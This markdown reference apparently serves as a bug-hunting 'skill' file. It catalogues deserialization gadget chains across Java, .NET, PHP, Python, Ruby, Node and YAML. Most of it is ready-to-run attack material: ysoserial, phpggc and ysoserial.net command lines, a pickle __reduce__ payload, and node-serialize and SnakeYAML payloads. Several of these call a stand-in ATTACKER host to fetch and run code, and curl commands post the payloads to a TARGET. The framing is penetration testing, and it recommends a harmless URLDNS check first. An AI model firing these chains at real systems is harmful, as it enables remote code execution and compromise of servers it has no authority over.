# Deserialization — Gadget Chain Catalog (per language x tool)

Companion to `hunt-deserialization`. The main skill has the *detection phase* (Shiro,
Log4Shell, phar://, pickle). This file is the **complete gadget-chain map** so you spend
zero time guessing which chain to fire once you know the byte format.

## 0. Byte-format fingerprint (read the first bytes before choosing)

| format | magic / tell | tool |
|---|---|---|
| Java serialized | `ac ed 00 05` (hex) / `rO0AB` (base64) | ysoserial |
| Java XStream | `<map>` XML, `<java.util.PriorityQueue>` | ysoserial / manual |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | ysoserial.net |
| .NET ViewState | `__VIEWSTATE` hidden field, base64 | ysoserial.net --plugin=ViewState |
| PHP serialize | `O:8:"stdClass":` / `a:2:{` | phpggc |
| Python pickle | `\x80\x04` (proto 4) / `\x80\x02` | manual `__reduce__` |
| Ruby Marshal | `\x04\x08` (hex) | universal gadget |
| Node | `_$$ND_FUNC$$_` IIFE, `{"rce":"..."}` | manual node-serialize |
| SnakeYAML | `!!javax.script.ScriptEngineManager` | manual |
| Json.NET (TypeNameHandling) | `$type` field in JSON | ysoserial.net |

## 1. ysoserial (Java) — the chain list, ranked by surviving-2026

```
CommonsCollections1–7   (CC1/CC3 Java ≤8u71; CC2/CC4 Java 8+ via PriorityQueue)
CommonsBeanutils1       (no commons-collections dep — high success)
Jdk7u21                 (no deps at all beyond JDK)
Groovy1                 (ConvertedClosure)
Spring1 / Spring2       (if spring-core on classpath)
Hibernate1 / Hibernate2
RmiRegistry1 / JRMPClient / JRMPListener
URLDNS                  (the SAFE detection payload — proves deserialization with no side effect)
```

**Use `URLDNS` first** to confirm the sink fires (zero harm), then escalate to a real
chain. `ysoserial URLDNS 'http://ATTACKER.oast'` → DNS callback = sink confirmed.

Generate + send base64:
```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/x' | base64 -w0 > payload.b64
curl -s -X POST https://TARGET/api -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.b64
```

## 2. phpggc (PHP) — framework chains

```
php phpggc -l            # list all chains (Laravel, Symfony, Monolog, Guzzle, ThinkPHP, Yii2, ...)
php phpggc Laravel/RCE5 system id
php phpggc Symfony/RCE4 system id
php phpggc Monolog/RCE1 system id
# phar polyglot (no unserialize() call needed):  phpggc -p phar -o poly.jpg Monolog/RCE1 system id
```
PHP `unserialize()` sinks map to the framework → pick the matching chain; phpggc's
top-level list names every class available, start with the framework the target runs.

## 3. ysoserial.net (.NET) — formatters & gadgets

```
dotnet ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
dotnet ysoserial.exe -f ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --validationkey=<key> --validationalg=SHA1
dotnet ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami"
```
Gadgets: `TypeConfuseDelegate`, `TextFormattingRunProperties`, `WindowsIdentity`,
`ObjectDataProvider`, `ActivitySurrogateSelector`. For ViewState you need the
`machineKey` validationKey (recovered via config leak / sidn / ToolShell chain).

## 4. Python pickle + YAML + JsonPickle

```python
import pickle, base64
class E:
    def __reduce__(self):
        return (__import__('os').system, ('curl http://ATTACKER/x',))
print(base64.b64encode(pickle.dumps(E())).decode())
```
PyYAML (unsafe `yaml.load`): `!!python/object/apply:os.system ["id"]`
JsonPickle / `sklearn` joblib also `__reduce__`.

## 5. Ruby Marshal + Psych YAML

```
# universal gadget via Gem::Requirement -> Gem::SpecFetcher -> Gem::Installer
--- !ruby/object:Gem::Installer
i: x
```
`Marshal.load` byte stream — use `generate` tools (ruby-deserialization gadgets from
ruby-advisory-db). Confirmed via a `Marshal.load` grep in source.

## 6. Node (node-serialize / serialize-javascript / funcster)

```
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('curl http://ATTACKER/x', ()=>{}); }()"}
```

## 7. SnakeYAML / JAXB / XStream (Java, format-tolerant)

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[ !!java.net.URL ["http://ATTACKER/exploit.jar"] ]]
]
# or JAXB via JdbcRowSetImpl + JNDI:  dataSourceName=ldap://ATTACKER, autoCommit=true
```
XStream `<sorted-set><dynamic-proxy><interface>...</interface><handler class="java.beans.EventHandler">...`

## 8. Escalation ladder

```
rung 1  URLDNS / DNS callback            → sink CONFIRMED (Informational by itself)
rung 2  gadget chain fires, no output    → blind RCE (OOB), Medium-High
rung 3  id/whoami in response            → High RCE
rung 4  privileged context (root/prod)   → Critical
```
The #1 discipline: **URLDNS detection first** — it proves the sink without side effects,
and a sink that only echoes your error is not yet a deserialization finding.